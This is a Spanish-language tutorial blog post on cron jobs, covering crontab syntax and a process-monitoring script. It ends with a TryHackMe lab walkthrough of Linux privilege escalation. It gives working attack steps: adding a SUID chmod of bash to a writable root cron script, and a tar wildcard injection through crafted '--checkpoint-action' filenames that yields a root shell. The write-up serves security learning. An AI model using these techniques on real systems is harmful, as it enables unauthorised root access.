---
title: Explotación de tareas Cron
date: 2021-12-28 16:46:23 -0500
categories: [Privilege Escalation, Linux]
tags: [privesc,linux,cron]
image:
  path: https://i.ibb.co/dPz847N/explotacion-de-tareas-cron.png
  alt: Explotación de tareas Cron 
---

A menudo hay formas de hacer las cosas de manera más rápida, como por ejemplo, las tareas. Algunos webmasters en vez de hacerlo manualmente prefieren ahorrarse el tiempo y automatizarlas. Esto en parte está bien, ya que no siempre vamos a poder estar presentes para ejecutar algo, pero a veces por culpa de una mala configuración esto puede salir muy mal.

## Cron

En los sistemas operativos Unix, cron es un demonio (proceso en segundo plano) que se ejecuta cuando alguien arranca el sistema operativo. Este se encargará de comprobar de acuerdo al tiempo especificado, si existe alguna tarea para ser ejecutada.

## Crontab

El crontab es un archivo donde se guardara una lista de comandos a ser ejecutada en un tiempo especificado por el usuario.

## Diferencias entre Cron y Crontab

**crontab** sería el archivo donde se escribirán la lista de comandos o scripts a ser ejecutadas en un determinado tiempo, estará específicamente diseñado para que sea leído correctamente por **cron** y proceder con la ejecución que nosotros hayamos programado.

## ¿Cómo se usa?

Para poner a funcionar una tarea en cron debemos crear un archivo crontab, pero primero debemos saber como es su sintaxis.

![/etc/crontab](https://i.ibb.co/ZTVqLb1/crontab-2.png)

Eso del `<user-name>` no necesario, porque puedes crear un archivo crontab para cada usuario como root, con `crontab -u <username> -e <username>` donde el parámetro `-u` es para especificar el usuario y `-e` para crear/editar las tareas a ejecutar del usuario.

Ejemplo: `*/1 * * * * touch /home/user/temp/$(date | cut -d ' ' -f 5)`

1.  `*/1` : Minuto
2.  `*` : Hora
3.  `*` : Día del mes
4.  `*` : Mes
5.  `*` : Día de la semana
6.  `touch /home/user/temp/$(date | cut -d ' ' -f 5)` : Comando o Script

Las instrucciones que le estamos dando en este ejemplo son bastante simples. Le estamos diciendo que nos cree un archivo que contenga de nombre la hora exacta del momento en el que lo creo. Así es como funcionaria:

![Ejemplo de un archivo crontab](https://i.ibb.co/hRCmb5t/crontab-1.png)

> Recurso para entender como funcionan las expresiones de programación **crontab**: [crontab.guru](https://crontab.guru).

## ¿Cuál es el riesgo de las tareas Cron?

En realidad no debería existir riesgo, pero lamentablemente si hacemos una mala programación de este, sí que lo hay. Por ejemplo, supongamos que te has creado un script en bash para hacer backups de tu sitio web y has programado a cron para que lo ejecute cada 24 horas:

```bash
#!/usr/bin/env bash

backup_files="/home /root /var/www/html"
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"
tar czf /mnt/backup/$archive_file $backup_files
```

Si analizamos el script no tiene nada raro, pero si le hacemos un listado largo al script (`ls -l`) nos muestra los siguientes permisos: `-rwx-w--w-`. Solo tenemos el permiso de escritura… yo sabiendo esto ya se me ocurre un vector de ataque, consiste en agregarle `chmod u+s /usr/bin/bash` con `echo` para que en el momento que cron ejecute el script como usuario root, agregue el permiso SUID a la bash.

## Detección de tareas Cron a través de un script en Bash

Este script hecho en bash sirve para ver tareas/procesos nuevos que están siendo ejecutados en tiempo real.

```bash
#!/usr/bin/env bash

old_process=$(ps -eo command)
while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]"
	old_process=$new_process
done
```

El uso y funcionamiento de este script es muy sencillo, lo que hace sería ejecutar el comando `ps -eo command` y almacenarlo en la variable old_process, luego entra en un bucle infinito donde ejecuta el mismo comando y lo almacena en una nueva variable llamada new_process, porque entre estas dos variables hay diferentes salidas, a pesar de que en las dos ejecutaran el mismo comando aún existe el delay de tiempo del momento en que fueron ejecutadas. Esto nos lleva a comparar las salidas de las dos variables con `diff` y que imprima las diferencias. Antes de repetir el mismo bucle varias veces debemos renovar el contenido de la variable old_process por la de new_process del momento.

> Una alternativa también seria [PsPy](https://github.com/DominicBreuker/pspy).


## Privilege Escalation

Para demostrar que tan critico es esto, voy a hacer una tarea del módulo [Linux PrivEsc](https://tryhackme.com/room/linuxprivesc) de la plataforma [TryHackMe](https://tryhackme.com).

### Cron Jobs - Wildcard

Para empezar primero debemos saber que **cron jobs** están corriendo ahora mismo en la máquina, y para detectarlos podemos usar el script ya explicado anteriormente “procmon.sh” (o también puedes usar PsPy). Yo lo crearé y guardaré en el directorio `/tmp` con el nombre `procmon.sh`.

> Ya guardado debemos asegurarnos si el script tiene permiso de ejecución (`chmod +x /tmp/procmon.sh`).

si corremos el script podemos detectar lo siguiente:

![procmon.sh](https://i.ibb.co/wwksFyq/2.png)

```bash
#!/usr/bin/env bash

cd /home/user
tar czf /tmp/backup.tar.gz *
```

lo primero que hace es entrar al directorio `home` de `user` y con el comando `tar` indicando los parámetros `czf` selecciona todos los archivos `*` y los mete en un comprimido llamado `backup.tar.gz` ubicado en `/tmp`.

Aquí nos podemos dar cuenta de algo muy crítico. El comodín `*` que se expande para incluir todos los archivos del directorio especificado. Si vemos la ayuda de `tar` podemos ver unos dos parámetros interesantes:

-   `--checkpoint[=NUMBER]` display progress messages every NUMBERth record (default 10)
-   `--checkpoint-action=ACTION` execute ACTION on each checkpoint

Sabiendo esto nos podemos plantear la siguiente pregunta: ¿y qué tal si en vez de comprimir más archivos mejor le asignamos unos parámetros?. Dado que a los nombres de los archivos los puede interpretar como opciones de parámetros válidos, crearemos `--checkpoint=1`, `--checkpoint-action=exec=a.sh` y un script con el nombre asignado anteriormente (`a.sh`) donde copiaremos la `/bin/bash` a la ruta `/tmp` y le asignaremos el permiso **SUID**.

```shell
user@debian:~$ touch ./--checkpoint=1 ./--checkpoint-action=exec=a.sh && echo 'cp /bin/bash /tmp && chmod u+s /tmp/bash' > ./a.sh && chmod +x ./a.sh
user@debian:~$ ls
a.sh --checkpoint=1 --checkpoint-action=exec=a.sh myvpn.ovpn tools
user@debian:~$ cat ./a.sh
cp /bin/bash /tmp && chmod u+s /tmp/bash
```
Ahora si nos ponemos en escucha con `watch -n 1 ls -l /tmp/bash` y si esperamos un rato, veremos que funciona. Solo nos quedaría ejecutar bash como su propietario con el parámetro `-p` y nos convertiremos en `root`:

![/tmp/bash -p](https://i.ibb.co/HCkH5b5/15.png)
